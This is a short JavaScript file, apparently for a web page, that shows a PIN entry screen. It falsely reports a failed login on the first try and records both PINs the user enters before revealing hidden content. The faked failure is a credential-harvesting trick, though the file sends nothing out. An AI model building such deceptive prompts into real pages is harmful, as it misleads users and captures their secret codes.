var fake = 0;
var pins = '';
var outputField = document.getElementById('output-pins');
var outputField2 = document.getElementById('output-pins2');
var fakeInputCode = document.getElementById('fakeinput');
var contentHTML = document.getElementById('nachhilfe');

function sayNo() {
    var changeText = document.getElementById('failed-attempts');
    changeText.innerText = '1 Fehlgeschlagener Anmeldeversuch';
    changeText.classList.add('sichtbar');
}

// Funktion zum Zurücksetzen der Kreise
function resetCircles(circles) {
    circles.forEach(circle => {
        circle.value = ''; // Leeren Sie den Inhalt des Kreises
        circle.classList.remove('filled'); // Entfernen Sie die 'filled'-Klasse
    });

    // Setzen Sie den Fokus auf den ersten Kreis
    circles[0].focus();
}

contentHTML.classList.add('versteckt');

document.addEventListener('DOMContentLoaded', function () {
    const circles = document.querySelectorAll('.circle');
    const failedAttempts = document.getElementById('failed-attempts');

    // Event-Handler für Eingabe in die Kreise
    circles.forEach((circle, index) => {
        circle.addEventListener('input', function () {
            // Überprüfen, ob die Eingabe eine Ziffer ist
            const enteredValue = circle.value;
            if (enteredValue.length === 1 && /^\d$/.test(enteredValue)) {
                circle.classList.add('filled'); // Fügt die CSS-Klasse für gefüllten Kreis hinzu
                if (index < circles.length - 1) {
                    // Wenn es nicht der letzte Kreis ist, den Fokus auf das nächste Eingabefeld setzen
                    circles[index + 1].focus();
                } else if (fake == 0) {
                    // Wenn es der letzte Kreis ist und fake gleich 0 ist, können Sie Ihre Überprüfungslogik hier implementieren

                    pins = Array.from(circles).map(circle => circle.value).join('');
                    outputField.innerText = pins;
                    sayNo();
                    resetCircles(circles);
                    fake = 1;
                } else if (fake == 1) {
                    pins = Array.from(circles).map(circle => circle.value).join('');
                    outputField2.innerText = pins;
                    fakeInputCode.classList.add('versteckt');
                    contentHTML.classList.add('sichtbar');
                }
            }
        });
    });
});
